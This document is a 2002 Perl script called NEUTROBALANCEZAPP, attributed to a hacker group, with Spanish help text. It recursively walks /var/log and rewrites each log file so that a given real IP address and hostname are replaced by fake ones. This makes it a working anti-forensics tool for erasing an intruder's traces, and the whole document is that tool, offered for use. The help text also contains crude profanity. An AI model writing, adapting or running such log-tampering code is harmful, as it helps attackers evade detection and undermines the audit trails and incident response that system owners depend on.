#!/usr/bin/perl
################################################################
# PROGRAMA = NEUTROBALANCEZAPP v.1.0                           #
# AUTOR = DDiego                                               #
# MAIL:Diegorba@yahoo.es                                       #
# URL: http://www.disidents.int-ltd.com - ver ASCII ;)         #
# MAILTEAM= disidents@yahoo.es                                 #
# Example; nzapp.pl 192.168.4.12 PC-412 192.168.0.1 SERVER1    #
################################################################

use File::Find;
die "sintaxis: $0  [ip a buscar] [host a buscar] [ip falsa] [host falso]
Escriba $0 --help para mas ayuda" unless ($ARGV[0]);
if ($ARGV[0] eq "--help") {
                           &ayuda;
                          }
else {
  print " .========================================================================.\n";
  print " ===============~ NEUTROBALANCEZAPP v.1.0 by DDiego ~======================\n";
  print " ==========================================================================\n\n";
$tuip=$ARGV[0];
$tuhost=$ARGV[1];
$ipfalsa=$ARGV[2];
$hostfalso=$ARGV[3];
print "Searching\n";
      find (\&wanted, '/var/log');
      sub wanted
                {
                 @archivos="$File::Find::name";
                 foreach $archivos (@archivos) {
                                                print "$archivos\n";
                                                open (documento, "$archivos") or die "No tiene permisos para ver el archivo\n";
                                                open (salida, "+<$archivos");
                                                foreach $lineas (<documento>){
                                                $lineas =~ s/$tuip/$ipfalsa/g;
                                                $lineas =~ s/$tuhost/$hostfalso/g;
                                                print salida "$lineas";
                                               }
                                               close (documento);
                }
       }


sub ayuda {

print <<'ayudita';

.==========================================================================.
=                     Ayuda  NEUTROBALANCEZAPP                             =
============================================================================
=  [ip a buscar]   -> Tu ip real, que quireres falsear                     =
=  [host a buscar] -> Tu host real, que quireres falsear                   =
=  [ip falsa]      -> La ip falsa que quieres que reemplace a la tuya      =
=  [host falsa]    -> El host falso que quieres que reemplace a la tuya    =
============================================================================

ni neutrobalance ni pollas dos hostias bien das
ayudita
           }



}

print "\n";
print "                           ----------------------------------------------\n";
print "                           - Disidents Hacker Team - 2002               -\n";
print "                           - Webpage:  http://www.disidents.int-ltd.com -\n";
print "                           - Autor:    DDiego                           -\n";
print "                           - Mail:     DDiegorba\@yahoo.es              -\n";
print "                           - Mailteam: Disidents\@yahoo.es              -\n";
print "                           ----------------------------------------------\n";
